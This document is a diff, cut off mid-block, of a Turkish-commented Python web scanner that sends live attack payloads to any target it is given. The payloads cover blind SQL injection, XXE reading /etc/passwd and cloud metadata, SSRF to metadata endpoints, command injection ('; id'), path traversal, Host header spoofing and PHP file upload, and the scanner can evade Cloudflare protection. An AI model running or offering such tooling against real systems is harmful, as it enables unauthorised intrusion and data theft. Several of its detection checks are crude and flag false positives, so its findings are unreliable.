@@ -1,33 +1,61 @@
 #!/usr/bin/env python3
-# KSIB ULTRA FULL MEGA SCANNER PRO MAX + 10 FİKİR
-# pip install requests dnspython websocket-client
 
-import socket, ssl, requests, json, time, re, sys, hashlib, base64, random
+# pip install requests cloudscraper curl_cffi
+
+import socket, ssl, requests, json, time, re, sys, hashlib, base64, random, urllib.parse
 from datetime import datetime
 from urllib.parse import urlparse, urljoin, parse_qs, urlencode
 import urllib3
 urllib3.disable_warnings()
 
+# ============================================================
+# RENKLER
+# ============================================================
 R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
 M = "\033[95m"; C = "\033[96m"; N = "\033[0m"; BOLD = "\033[1m"
 
+# ============================================================
+# CLOUDFLARE BYPASS (opsiyonel)
+# ============================================================
+try:
+    import cloudscraper
+    CLOUDSCRAPER_AVAILABLE = True
+except:
+    CLOUDSCRAPER_AVAILABLE = False
+
+class CloudflareBypass:
+    @staticmethod
+    def create_session(use_bypass=False):
+        if use_bypass and CLOUDSCRAPER_AVAILABLE:
+            return cloudscraper.create_scraper(
+                browser={
+                    "browser": "chrome",
+                    "platform": "windows",
+                    "desktop": True
+                }
+            )
+        return requests.Session()
+
+# ============================================================
+# ANA SCANNER
+# ============================================================
 class ProMaxPlusScanner:
-    def __init__(self, target):
+    def __init__(self, target, bypass_cloudflare=False):
         self.target = target
         self.start = time.time()
-        self.session = requests.Session()
+        self.bypass_cloudflare = bypass_cloudflare
+        self.session = CloudflareBypass.create_session(bypass_cloudflare)
         self.session.headers.update({
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
             "Accept": "*/*",
             "Connection": "keep-alive"
         })
-        self.session.timeout = 2
+        self.session.timeout = 3
 
         self.results = {
             "target": target,
-            "dns": {},
+            "bypass_cloudflare": bypass_cloudflare,
             "ports": [],
-            "banners": [],
             "ssl": {},
             "headers": {},
             "security_headers": {},
@@ -38,55 +66,33 @@ class ProMaxPlusScanner:
             "subdomains": [],
             "vulns": [],
             "emails": [],
-            "links": [],
-            "forms": [],
-            "cookies": [],
-            "server": None,
             "parameters": [],
-            "js_endpoints": [],
             "api_endpoints": [],
             "backup_files": [],
-            "robots": [],
-            "sitemap_urls": [],
-            "hardcoded_secrets": [],
-            "metatags": {},
-            "cors": {},
-            "tls_versions": [],
-            "http_methods": {},
-            "response_times": [],
-            "subdomain_takeover": [],
-            "dns_zone": [],
-            "spf_dmarc": {},
             "interesting_files": [],
             "status_codes": {},
             "wp_users": [],
             "wp_plugins": [],
             "wp_version": None,
-            "rate_limit": {"tested": False, "result": "Bilgi yok"},
-            "twofa_bypass": {"tested": False, "result": "Bilgi yok"},
-            "idor": {"tested": False, "result": "Bilgi yok"},
             "sqli_tests": [],
             "xss_tests": [],
             "open_redirect_tests": [],
             "api_fuzz": [],
             "websocket": {"found": False, "url": None},
-            "grpc": {"found": False, "url": None}
+            "grpc": {"found": False, "url": None},
+            "blind_sqli_tests": [],
+            "xxe_tests": [],
+            "ssrf_tests": [],
+            "csrf_tests": [],
+            "jwt_tests": [],
+            "cors_tests": [],
+            "host_header_tests": [],
+            "path_traversal_tests": [],
+            "command_injection_tests": [],
+            "file_upload_tests": []
         }
 
-        # PORTLAR (200+)
-        self.ports = [
-            21,22,23,25,53,80,110,111,135,139,143,161,443,445,465,
-            514,587,631,636,873,993,995,1080,1099,1352,1433,1521,1723,
-            2049,2083,2087,2222,2401,3000,3128,3306,3389,3690,4352,
-            4443,4646,5000,5001,5222,5223,5432,5544,5555,5666,5800,
-            5900,5984,6379,7000,7001,7070,7171,7190,7443,7474,7475,
-            7777,8000,8001,8008,8080,8081,8088,8090,8091,8092,8123,
-            8140,8161,8181,8443,8448,8765,8888,9000,9001,9009,9010,
-            9042,9090,9092,9100,9151,9160,9200,9300,9418,9999,
-            10000,11000,11211,20000,27017,28015,29015,30000,32768
-        ]
-
-        # DİZİNLER (300+)
+        # ============ DİZİNLER ============
         self.dirs = [
             "/", "/admin", "/login", "/wp-admin", "/phpmyadmin", "/.git", "/.env",
             "/robots.txt", "/sitemap.xml", "/favicon.ico", "/backup", "/test", "/dev",
@@ -142,13 +148,14 @@ class ProMaxPlusScanner:
             "/wp-admin/user-new.php", "/wp-admin/users.php", "/wp-admin/widgets.php",
             "/.git/config", "/.git/HEAD", "/.git/index", "/.git/objects",
             "/.svn/entries", "/.svn/wc.db", "/.env", "/.env.backup",
-            "/.aws/credentials", "/.ssh/id_rsa", "/.ssh/authorized_keys"
+            "/.aws/credentials", "/.ssh/id_rsa", "/.ssh/authorized_keys",
+            "/upload", "/uploads", "/media", "/images", "/files", "/file", "/data", "/download", "/downloads"
         ]
 
-        # SUBDOMAIN (150+)
+        # ============ SUBDOMAIN ============
         self.subdomains = [
-            "www", "mail", "ftp", "dev", "test", "stage", "staging", "api", "admin",
-            "cdn", "static", "blog", "shop", "docs", "support", "demo", "backup",
+            "www", "mail", "ftp", "dev", "test", "stage", "staging", "api", "admin", "cdn",
+            "static", "blog", "shop", "docs", "support", "demo", "backup", "old", "new",
             "beta", "alpha", "preprod", "uat", "qa", "vpn", "secure", "portal",
             "gateway", "edge", "internal", "office", "remote", "db", "mysql",
             "postgres", "mongodb", "redis", "elastic", "search", "analytics",
@@ -171,7 +178,20 @@ class ProMaxPlusScanner:
             "about", "contact", "support", "help", "career", "jobs"
         ]
 
-        self.total = len(self.dirs) + len(self.subdomains) + len(self.ports) + 40
+        # ============ PORTLAR ============
+        self.ports = [
+            21,22,23,25,53,80,110,111,135,139,143,161,443,445,465,
+            514,587,631,636,873,993,995,1080,1099,1352,1433,1521,1723,
+            2049,2083,2087,2222,2401,3000,3128,3306,3389,3690,4352,
+            4443,4646,5000,5001,5222,5223,5432,5544,5555,5666,5800,
+            5900,5984,6379,7000,7001,7070,7171,7190,7443,7474,7475,
+            7777,8000,8001,8008,8080,8081,8088,8090,8091,8092,8123,
+            8140,8161,8181,8443,8448,8765,8888,9000,9001,9009,9010,
+            9042,9090,9092,9100,9151,9160,9200,9300,9418,9999,
+            10000,11000,11211,20000,27017,28015,29015,30000,32768
+        ]
+
+        self.total = len(self.dirs) + len(self.subdomains) + len(self.ports) + 50
         self.done = 0
 
         self.waf_sigs = {
@@ -191,48 +211,6 @@ class ProMaxPlusScanner:
             "Akamai": ["akamai", "x-ak"],
             "Fastly": ["x-fastly", "fastly"]
         }
-        self.tech_patterns = {
-            "WordPress": r"(wp-content|wp-includes|wp-json)",
-            "Laravel": r"(laravel|csrf-token|_token)",
-            "Django": r"(csrfmiddlewaretoken|django)",
-            "React": r"(react|_reactRootContainer)",
-            "Angular": r"(angular|ng-app)",
-            "Vue": r"(vue|v-bind|v-for)",
-            "Bootstrap": r"(bootstrap|data-bs-)",
-            "jQuery": r"(jquery|\$\(document\))",
-            "Nginx": r"(nginx|server: nginx)",
-            "Apache": r"(apache|server: apache)",
-            "IIS": r"(iis|server: microsoft-iis)",
-            "Tomcat": r"(tomcat|server: apache-coyote)",
-            "Node.js": r"(node|express|server: nodejs)",
-            "Ruby on Rails": r"(rails|ruby)",
-            "PHP": r"(php|\.php|<?php)",
-            "Python": r"(python|wsgi|uwsgi)",
-            "Magento": r"(magento|skin/frontend)",
-            "Shopify": r"(shopify|myshopify)",
-            "Joomla": r"(joomla|com_content)",
-            "Drupal": r"(drupal|sites/all)",
-            "Gatsby": r"(gatsby|_gatsby)",
-            "Next.js": r"(next|_next)",
-            "Nuxt": r"(nuxt|_nuxt)",
-            "Svelte": r"(svelte|_svelte)",
-            "Tailwind": r"(tailwind|tw-)",
-            "Font Awesome": r"(fa-|font-awesome)"
-        }
-        self.vuln_patterns = {
-            "SQL Injection": r"(sql|mysql|postgresql|oracle|database error|syntax error|unclosed quotation)",
-            "XSS": r"(<script|alert\(|prompt\(|onerror=|onload=)",
-            "LFI/RFI": r"(etc/passwd|windows/win.ini|\.\./|include\()",
-            "RCE": r"(system\(|exec\(|eval\(|passthru\()",
-            ".git Exposed": r"(git/HEAD|refs/heads/master|objects/|refs/)",
-            ".env Exposed": r"(DB_HOST|DB_NAME|DB_USER|DB_PASS|APP_KEY|SECRET)",
-            "PHPInfo": r"(phpinfo\(|PHP Version|Zend Engine)",
-            "Dir Listing": r"(index of /|parent directory|directory listing)",
-            "XXE": r"(!DOCTYPE|!ENTITY|SYSTEM|PUBLIC)",
-            "SSRF": r"(url=|path=|dest=|redirect=)",
-            "Open Redirect": r"(redirect=|return=|next=)",
-            "Sensitive Data": r"(\b[0-9]{16}\b|\b\d{3}-\d{2}-\d{4}\b)"
-        }
 
     def log(self, msg, status="info"):
         icons = {"info":"[*]", "success":"[+]", "error":"[-]", "warning":"[!]", "found":"[>]", "critical":"[!]", "test":"[T]"}
@@ -245,65 +223,27 @@ class ProMaxPlusScanner:
         print(f"\r[PROG] {bar} {pct}% | {self.done}/{self.total} | ETA: {eta}", end="")
         if pct == 100: print()
 
-    # ==================== 1. DNS ====================
-    def dns(self):
-        self.log("DNS bilgileri...", "scan")
+    def get(self, url, **kwargs):
         try:
-            ip = socket.gethostbyname(self.target)
-            self.results["dns"]["ip"] = ip
-            self.log(f"IP: {ip}", "success")
-            try:
-                host = socket.gethostbyaddr(ip)[0]
-                self.results["dns"]["hostname"] = host
-                self.log(f"Hostname: {host}", "success")
-            except: pass
-            try:
-                import dns.resolver
-                ns = dns.resolver.resolve(self.target, 'NS', lifetime=2)
-                for ns_server in ns:
-                    try:
-                        import dns.zone
-                        zone = dns.zone.from_xfr(dns.query.xfr(str(ns_server), self.target))
-                        self.results["dns_zone"] = [str(name) for name in zone.nodes.keys()]
-                        if self.results["dns_zone"]:
-                            self.log(f"Zone transfer: {len(self.results['dns_zone'])} kayit", "found")
-                    except: pass
-                for rtype in ["TXT", "MX", "NS", "SOA"]:
-                    try:
-                        answers = dns.resolver.resolve(self.target, rtype, lifetime=2)
-                        self.results["dns"][rtype.lower()] = [str(r) for r in answers]
-                        if rtype == "TXT":
-                            for txt in answers:
-                                if "spf" in str(txt).lower():
-                                    self.results["spf_dmarc"]["spf"] = str(txt)
-                                if "dmarc" in str(txt).lower():
-                                    self.results["spf_dmarc"]["dmarc"] = str(txt)
-                    except: pass
-                if self.results["spf_dmarc"]:
-                    self.log(f"SPF/DMARC: {self.results['spf_dmarc']}", "found")
-            except: pass
-        except Exception as e:
-            self.log(f"DNS hatasi: {e}", "error")
-        self.done += 1; self.progress()
+            return self.session.get(url, **kwargs)
+        except:
+            return None
 
-    # ==================== 2. PORT + BANNER ====================
+    def post(self, url, **kwargs):
+        try:
+            return self.session.post(url, **kwargs)
+        except:
+            return None
+
+    # ==================== 1. PORT ====================
     def port(self):
         self.log(f"Portlar taranıyor ({len(self.ports)})...", "scan")
         for p in self.ports:
             try:
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(0.3)
+                s.settimeout(0.5)
                 if s.connect_ex((self.target, p)) == 0:
                     self.results["ports"].append(p)
-                    try:
-                        s.settimeout(1)
-                        if p in [21,25,80,110,143,443,587,993,995,3306,5432,6379]:
-                            s.send(b"HEAD / HTTP/1.0\r\n\r\n" if p in [80,443,8080,8443] else b"\r\n")
-                            banner = s.recv(256).decode('utf-8', errors='ignore').strip()
-                            if banner:
-                                self.results["banners"].append({"port": p, "banner": banner[:100]})
-                                self.log(f"Port {p} Banner: {banner[:50]}", "found")
-                    except: pass
                     self.log(f"Port {p} ACIK", "found")
                 s.close()
             except: pass
@@ -311,50 +251,40 @@ class ProMaxPlusScanner:
             if self.done % 20 == 0: self.progress()
         self.progress()
 
-    # ==================== 3. SSL + TLS ====================
+    # ==================== 2. SSL ====================
     def ssl(self):
-        self.log("SSL/TLS kontrol...", "scan")
-        for version in [ssl.PROTOCOL_TLSv1, ssl.PROTOCOL_TLSv1_1, ssl.PROTOCOL_TLSv1_2]:
-            try:
-                ctx = ssl.SSLContext(version)
-                with ctx.wrap_socket(socket.socket(), server_hostname=self.target) as s:
-                    s.settimeout(2)
-                    s.connect((self.target, 443))
-                    self.results["tls_versions"].append(str(version))
-                    self.log(f"TLS versiyon destekleniyor: {version}", "warning" if version in [ssl.PROTOCOL_TLSv1, ssl.PROTOCOL_TLSv1_1] else "success")
-            except: pass
+        self.log("SSL kontrol...", "scan")
         try:
             ctx = ssl.create_default_context()
             with ctx.wrap_socket(socket.socket(), server_hostname=self.target) as s:
                 s.settimeout(3)
                 s.connect((self.target, 443))
                 cipher = s.cipher()[0]
-                self.results["ssl"] = {"active": True, "cipher": cipher, "protocol": s.version()}
+                self.results["ssl"] = {"active": True, "cipher": cipher}
                 self.log(f"SSL Aktif - {cipher}", "success")
         except:
             self.results["ssl"] = {"active": False}
             self.log("SSL yok", "warning")
         self.done += 1; self.progress()
 
-    # ==================== 4. HEADER ====================
+    # ==================== 3. HEADER ====================
     def header(self):
         self.log("Header'lar...", "scan")
         for proto in ["https", "http"]:
             try:
-                r = self.session.get(f"{proto}://{self.target}", timeout=2, verify=False)
+                r = self.get(f"{proto}://{self.target}", timeout=3, verify=False)
+                if not r: continue
                 headers = dict(r.headers)
                 self.results["headers"] = headers
                 for k, v in list(headers.items())[:12]:
                     self.log(f"{k}: {v[:50]}", "found")
                 if "Server" in headers:
-                    self.results["server"] = headers["Server"]
                     self.results["tech"].append(f"Server: {headers['Server']}")
                 sec_headers = {
                     "Strict-Transport-Security": "HSTS eksik!",
                     "Content-Security-Policy": "CSP eksik!",
                     "X-Frame-Options": "Clickjacking riski!",
-                    "X-Content-Type-Options": "MIME-sniff riski!",
-                    "Referrer-Policy": "Referrer bilgisi sızıyor!"
+                    "X-Content-Type-Options": "MIME-sniff riski!"
                 }
                 for h, msg in sec_headers.items():
                     if h not in headers:
@@ -369,283 +299,187 @@ class ProMaxPlusScanner:
                     if any(s in combined for s in sigs):
                         self.results["cloud"] = cloud
                         self.log(f"Cloud: {cloud}", "found")
-                if r.cookies:
-                    self.results["cookies"] = list(r.cookies.keys())
                 break
             except:
                 continue
         self.done += 1; self.progress()
 
-    # ==================== 5. HTTP METHODS ====================
-    def http_methods(self):
-        self.log("HTTP Methods test...", "scan")
-        methods = ["OPTIONS", "PUT", "DELETE", "PATCH", "TRACE", "CONNECT"]
-        for method in methods:
-            try:
-                r = self.session.request(method, f"https://{self.target}", timeout=2, verify=False)
-                if r.status_code not in [405, 501]:
-                    self.results["http_methods"][method] = r.status_code
-                    self.log(f"Method {method}: {r.status_code}", "found")
-            except:
-                pass
-        self.done += 1; self.progress()
-
-    # ==================== 6. TECH ====================
-    def tech(self):
-        self.log("Teknolojiler...", "scan")
-        try:
-            r = self.session.get(f"https://{self.target}", timeout=2, verify=False)
-            content = r.text
-            for name, pattern in self.tech_patterns.items():
-                if re.search(pattern, content, re.IGNORECASE):
-                    if name not in self.results["tech"]:
-                        self.results["tech"].append(name)
-                        self.log(f"Tech: {name}", "found")
-            # 7. WordPress version
-            if "WordPress" in self.results["tech"]:
-                try:
-                    wp_login = self.session.get(f"https://{self.target}/wp-login.php", timeout=2, verify=False)
-                    for meta in re.findall(r'<meta[^>]+>', wp_login.text):
-                        if 'name="generator"' in meta and "WordPress" in meta:
-                            version = re.search(r'WordPress ([0-9.]+)', meta)
-                            if version:
-                                self.results["wp_version"] = version.group(1)
-                                self.log(f"WordPress version: {version.group(1)}", "found")
-                    if not self.results["wp_version"]:
-                        css = self.session.get(f"https://{self.target}/wp-admin/css/install.css", timeout=2, verify=False)
-                        for line in css.text.split("\n"):
-                            if "Version" in line:
-                                version = re.search(r'Version: ([0-9.]+)', line)
-                                if version:
-                                    self.results["wp_version"] = version.group(1)
-                                    self.log(f"WordPress version: {version.group(1)}", "found")
-                except: pass
-        except:
-            pass
-        self.done += 1; self.progress()
-
-    # ==================== 7. DİZİN ====================
+    # ==================== 4. DİZİN + TÜM TESTLER ====================
     def dir(self):
         self.log(f"Dizinler ({len(self.dirs)})...", "scan")
         for d in self.dirs:
             for proto in ["https", "http"]:
                 try:
                     url = f"{proto}://{self.target}{d}"
-                    start_time = time.time()
-                    r = self.session.get(url, timeout=1.2, verify=False, allow_redirects=False)
-                    rt = (time.time() - start_time)
-                    self.results["response_times"].append(rt)
+                    r = self.get(url, timeout=2, verify=False, allow_redirects=False)
+                    if not r: continue
 
                     if r.status_code in [200, 301, 302, 403, 401, 405, 500, 502, 503]:
                         self.results["dirs"].append({"path": d, "status": r.status_code})
                         self.results["status_codes"][str(r.status_code)] = self.results["status_codes"].get(str(r.status_code), 0) + 1
                         self.log(f"{d} -> {r.status_code}", "found")
-                        self.results["response_times"].append(rt)
 
-                        # 8. API fuzzing
+                        # API
                         if d.startswith("/api") or d == "/graphql" or d == "/wp-json":
                             self.results["api_endpoints"].append({"path": d, "status": r.status_code})
                             self.log(f"API: {d} -> {r.status_code}", "found")
 
-                        # 9. WebSocket
-                        if 'new WebSocket(' in r.text or 'ws://' in r.text or 'wss://' in r.text:
+                        # WebSocket
+                        if r.text and ('new WebSocket(' in r.text or 'ws://' in r.text or 'wss://' in r.text):
                             ws_match = re.search(r'(wss?://[^\s"\']+)', r.text)
                             if ws_match:
                                 self.results["websocket"]["found"] = True
                                 self.results["websocket"]["url"] = ws_match.group(1)
                                 self.log(f"WebSocket: {ws_match.group(1)}", "found")
 
-                        # 10. gRPC (HTTP/2)
-                        if "application/grpc" in str(r.headers) or "grpc-" in str(r.headers).lower():
+                        # gRPC
+                        if r.headers and ("application/grpc" in str(r.headers) or "grpc-" in str(r.headers).lower()):
                             self.results["grpc"]["found"] = True
                             self.results["grpc"]["url"] = url
                             self.log(f"gRPC: {url}", "found")
 
-                        # ============ YENİ TESTLER ============
-                        # 1. SQLi test (parametreler varsa)
-                        params = re.findall(r'\?([a-zA-Z0-9_]+)=', r.text)
-                        for param in params:
-                            if param not in self.results["parameters"]:
-                                self.results["parameters"].append(param)
-                            # SQLi dene
-                            payloads = ["'", '"', "1=1'", "1=1\""]
-                            for payload in payloads:
-                                test_url = f"{url}?{param}={payload}"
-                                try:
-                                    test_r = self.session.get(test_url, timeout=2, verify=False)
-                                    if "syntax error" in test_r.text.lower() or "mysql" in test_r.text.lower() or "sql" in test_r.text.lower():
-                                        self.results["sqli_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU!"})
-                                        self.results["vulns"].append({"url": test_url, "type": f"SQLi ({payload})"})
-                                        self.log(f"SQLi: {param}={payload} -> BULUNDU!", "critical")
-                                    else:
-                                        self.results["sqli_tests"].append({"url": test_url, "payload": payload, "status": "Güvende"})
-                                        self.log(f"SQLi: {param}={payload} -> Güvende", "test")
-                                except:
-                                    self.results["sqli_tests"].append({"url": test_url, "payload": payload, "status": "Test başarısız"})
-                                    self.log(f"SQLi: {param}={payload} -> Test başarısız", "error")
+                        # ==================== PARAMETRE BUL ====================
+                        if r.text:
+                            params = re.findall(r'\?([a-zA-Z0-9_]+)=', r.text)
+                            for p in params:
+                                if p not in self.results["parameters"]:
+                                    self.results["parameters"].append(p)
 
-                            # 2. XSS test
-                            xss_payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>']
-                            for payload in xss_payloads:
-                                test_url = f"{url}?{param}={payload}"
-                                try:
-                                    test_r = self.session.get(test_url, timeout=2, verify=False)
-                                    if payload in test_r.text:
-                                        self.results["xss_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU!"})
-                                        self.results["vulns"].append({"url": test_url, "type": f"XSS ({payload[:20]})"})
-                                        self.log(f"XSS: {param}={payload[:20]} -> BULUNDU!", "critical")
-                                    else:
-                                        self.results["xss_tests"].append({"url": test_url, "payload": payload, "status": "Güvende"})
-                                        self.log(f"XSS: {param}={payload[:20]} -> Güvende", "test")
-                                except:
-                                    self.results["xss_tests"].append({"url": test_url, "payload": payload, "status": "Test başarısız"})
-                                    self.log(f"XSS: {param}={payload[:20]} -> Test başarısız", "error")
+                            # ==================== 1. BLIND SQLi ====================
+                            for param in params[:5]:
+                                for payload in ["' OR sleep(5)--", "\" OR sleep(5)--", "' OR pg_sleep(5)--"]:
+                                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
+                                    try:
+                                        start_t = time.time()
+                                        test_r = self.get(test_url, timeout=10, verify=False)
+                                        elapsed = time.time() - start_t
+                                        if elapsed > 4:
+                                            self.results["blind_sqli_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU!"})
+                                            self.results["vulns"].append({"url": test_url, "type": f"Blind SQLi ({payload[:20]})"})
+                                            self.log(f"Blind SQLi: {param} -> {elapsed:.1f}s BULUNDU!", "critical")
+                                        # SADECE BULUNDU veya HATA loglanır, "Güvende" loglanmaz
+                                    except Exception as e:
+                                        self.results["blind_sqli_tests"].append({"url": test_url, "payload": payload, "status": "HATA"})
+                                        self.log(f"Blind SQLi: {param} -> HATA", "error")
 
-                            # 3. Open Redirect
-                            redirect_payloads = ['https://evil.com', '//evil.com', 'javascript:alert(1)']
-                            for payload in redirect_payloads:
-                                test_url = f"{url}?redirect={payload}&url={payload}&next={payload}&return={payload}"
-                                try:
-                                    test_r = self.session.get(test_url, timeout=2, verify=False, allow_redirects=False)
-                                    if test_r.status_code in [301, 302, 307] and "evil.com" in test_r.headers.get("Location", ""):
-                                        self.results["open_redirect_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU!"})
-                                        self.results["vulns"].append({"url": test_url, "type": f"Open Redirect ({payload})"})
-                                        self.log(f"Open Redirect: {payload} -> BULUNDU!", "critical")
-                                    else:
-                                        self.results["open_redirect_tests"].append({"url": test_url, "payload": payload, "status": "Güvende"})
-                                        self.log(f"Open Redirect: {payload} -> Güvende", "test")
-                                except:
-                                    self.results["open_redirect_tests"].append({"url": test_url, "payload": payload, "status": "Test başarısız"})
-                                    self.log(f"Open Redirect: {payload} -> Test başarısız", "error")
+                            # ==================== 2. XXE ====================
+                            if "xml" in url.lower() or (r.text and "xml" in r.text.lower()):
+                                xxe_payloads = [
+                                    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
+                                    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://169.254.169.254">]><root>&test;</root>'
+                                ]
+                                for payload in xxe_payloads:
+                                    try:
+                                        test_r = self.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=3, verify=False)
+                                        if test_r and ("root" in test_r.text or "passwd" in test_r.text):
+                                            self.results["xxe_tests"].append({"url": url, "payload": payload[:30], "status": "BULUNDU!"})
+                                            self.results["vulns"].append({"url": url, "type": "XXE"})
+                                            self.log(f"XXE: BULUNDU! ({url})", "critical")
+                                        # "Güvende" loglanmaz
+                                    except:
+                                        self.results["xxe_tests"].append({"url": url, "payload": payload[:30], "status": "HATA"})
+                                        self.log(f"XXE: HATA ({url})", "error")
 
-                        # 4. Rate limit (login sayfaları)
-                        login_pages = ["/login", "/wp-login.php", "/admin/login", "/signin", "/auth/login"]
-                        if d in login_pages and r.status_code in [200, 405]:
-                            self.log(f"Rate limit test: {d}", "scan")
-                            success = 0
-                            for i in range(10):
+                            # ==================== 3. SSRF ====================
+                            ssrf_targets = ["169.254.169.254", "127.0.0.1", "localhost", "metadata.google.internal"]
+                            for param in params[:5]:
+                                for target in ssrf_targets:
+                                    test_url = f"{url}?{param}={urllib.parse.quote(f'http://{target}')}"
+                                    try:
+                                        test_r = self.get(test_url, timeout=3, verify=False)
+                                        if test_r and ("ec2" in test_r.text or "metadata" in test_r.text or "169.254" in test_r.text):
+                                            self.results["ssrf_tests"].append({"url": test_url, "payload": target, "status": "BULUNDU!"})
+                                            self.results["vulns"].append({"url": test_url, "type": f"SSRF ({target})"})
+                                            self.log(f"SSRF: {target} -> BULUNDU!", "critical")
+                                    except:
+                                        self.results["ssrf_tests"].append({"url": test_url, "payload": target, "status": "HATA"})
+                                        self.log(f"SSRF: {target} -> HATA", "error")
+
+                            # ==================== 4. CSRF ====================
+                            if r.text and "<form" in r.text.lower():
+                                has_token = bool(re.search(r'csrf|token|_token|authenticity', r.text, re.IGNORECASE))
+                                if not has_token:
+                                    self.results["csrf_tests"].append({"url": url, "status": "TOKEN EKSIK!"})
+                                    self.results["vulns"].append({"url": url, "type": "CSRF (token yok)"})
+                                    self.log(f"CSRF: Token yok! ({url})", "critical")
+
+                            # ==================== 5. JWT ====================
+                            if r.text and ("jwt" in r.text.lower() or "Bearer" in r.text):
+                                jwt_match = re.search(r'Bearer ([a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+?\.[a-zA-Z0-9\-_]+)', r.text)
+                                if jwt_match:
+                                    token = jwt_match.group(1)
+                                    parts = token.split('.')
+                                    if len(parts) == 3:
+                                        try:
+                                            header = json.loads(base64.b64decode(parts[0] + '==').decode())
+                                            alg = header.get('alg', 'none')
+                                            self.results["jwt_tests"].append({"url": url, "alg": alg, "status": "BULUNDU"})
+                                            self.log(f"JWT: {alg} alg ({url})", "found")
+                                            if alg == 'none':
+                                                self.results["vulns"].append({"url": url, "type": f"JWT none alg"})
+                                                self.log(f"JWT: none alg! ({url})", "critical")
+                                        except:
+                                            pass
+
+                            # ==================== 6. CORS ====================
+                            if "Access-Control-Allow-Origin" in r.headers:
+                                origin = r.headers.get("Access-Control-Allow-Origin")
+                                self.results["cors_tests"].append({"url": url, "origin": origin})
+                                if origin == "*":
+                                    self.results["vulns"].append({"url": url, "type": "CORS (*)"})
+                                    self.log(f"CORS: * ({url})", "critical")
+
+                            # ==================== 7. Host Header Injection ====================
+                            try:
+                                host_headers = {"Host": "evil.com", "X-Forwarded-Host": "evil.com", "X-Host": "evil.com"}
+                                for hname, hvalue in host_headers.items():
+                                    test_r = self.get(url, timeout=2, verify=False, headers={hname: hvalue})
+                                    if test_r and ("evil.com" in test_r.text or "evil" in test_r.text):
+                                        self.results["host_header_tests"].append({"url": url, "header": hname, "status": "BULUNDU!"})
+                                        self.results["vulns"].append({"url": url, "type": f"Host Header Injection ({hname})"})
+                                        self.log(f"Host Header: {hname} -> BULUNDU!", "critical")
+                            except:
+                                pass
+
+                            # ==================== 8. Path Traversal ====================
+                            if params and any(x in url for x in ["file", "path", "dir", "page", "view", "load"]):
+                                for payload in ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "../../etc/hosts"]:
+                                    test_url = f"{url}?{params[0]}={urllib.parse.quote(payload)}"
+                                    try:
+                                        test_r = self.get(test_url, timeout=2, verify=False)
+                                        if test_r and ("root:x" in test_r.text or "localhost" in test_r.text or "Forbidden" not in test_r.text):
+                                            self.results["path_traversal_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU!"})
+                                            self.results["vulns"].append({"url": test_url, "type": f"Path Traversal ({payload})"})
+                                            self.log(f"Path Traversal: {payload} -> BULUNDU!", "critical")
+                                    except:
+                                        pass
+
+                            # ==================== 9. Command Injection ====================
+                            if params and any(x in url for x in ["ping", "cmd", "exec", "run", "shell", "system"]):
+                                for payload in ["; ls", "; id", "&& id", "| whoami"]:
+                                    test_url = f"{url}?{params[0]}={urllib.parse.quote(payload)}"
+                                    try:
+                                        test_r = self.get(test_url, timeout=2, verify=False)
+                                        if test_r and ("uid" in test_r.text or "root" in test_r.text or "bin" in test_r.text):
+                                            self.results["command_injection_tests"].append({"url": test_url, "payload": payload, "status": "BULUNDU!"})
+                                            self.results["vulns"].append({"url": test_url, "type": f"Command Injection ({payload})"})
+                                            self.log(f"Command Injection: {payload} -> BULUNDU!", "critical")
+                                    except:
+                                        pass
+
+                            # ==================== 10. File Upload ====================
+                            if "/upload" in d or "/uploads" in d:
+                                php_content = '<?php echo "test"; ?>'
+                                files = {'file': ('test.php', php_content, 'application/x-php')}
                                 try:
-                                    test_r = self.session.post(f"{url}", data={"username": "test", "password": "test"}, timeout=1, verify=False)
-                                    if test_r.status_code in [429, 503, 429]:
-                                        self.results["rate_limit"]["tested"] = True
-                                        self.results["rate_limit"]["result"] = "Rate limit VAR (429/503)"
-                                        self.log(f"Rate limit: VAR! ({test_r.status_code})", "found")
-                                        break
-                                    if test_r.status_code in [200, 302]:
-                                        success += 1
+                                    test_r = self.post(url, files=files, timeout=5, verify=False)
+                                    if test_r and ("test" in test_r.text or "uploaded" in test_r.text.lower()):
+                                        self.results["file_upload_tests"].append({"url": url, "status": "BULUNDU!"})
+                                        self.results["vulns"].append({"url": url, "type": "File Upload (.php)"})
+                                        self.log(f"File Upload: .php yüklenebilir! ({url})", "critical")
                                 except:
                                     pass
-                            if success >= 8 and not self.results["rate_limit"]["tested"]:
-                                self.results["rate_limit"]["tested"] = True
-                                self.results["rate_limit"]["result"] = "Rate limit YOK (10 istek başarılı)"
-                                self.log("Rate limit: YOK! (10 istek başarılı)", "warning")
 
-                        # 5. 2FA bypass
-                        protected_pages = ["/dashboard", "/admin", "/profile", "/wp-admin", "/account"]
-                        if d in protected_pages and r.status_code == 302:
-                            self.results["twofa_bypass"]["tested"] = True
-                            self.results["twofa_bypass"]["result"] = "Yönlendirme var, 2FA/oturum kontrolü çalışıyor"
-                            self.log("2FA test: Yönlendirme var (güvende)", "success")
-                        elif d in protected_pages and r.status_code == 200:
-                            self.results["twofa_bypass"]["tested"] = True
-                            self.results["twofa_bypass"]["result"] = "DİREKT ERİŞİM! (2FA atlanabilir)"
-                            self.results["vulns"].append({"url": url, "type": "2FA Bypass (doğrudan erişim)"})
-                            self.log("2FA test: DİREKT ERİŞİM! (2FA yok)", "critical")
-
-                        # 6. IDOR test
-                        id_patterns = [r'/user/(\d+)', r'/profile/(\d+)', r'id=(\d+)', r'user_id=(\d+)']
-                        for pattern in id_patterns:
-                            ids = re.findall(pattern, r.text)
-                            for uid in ids[:3]:
-                                test_id = str(int(uid) + 1) if uid.isdigit() else "2"
-                                test_url = re.sub(r'\d+', test_id, url)
-                                try:
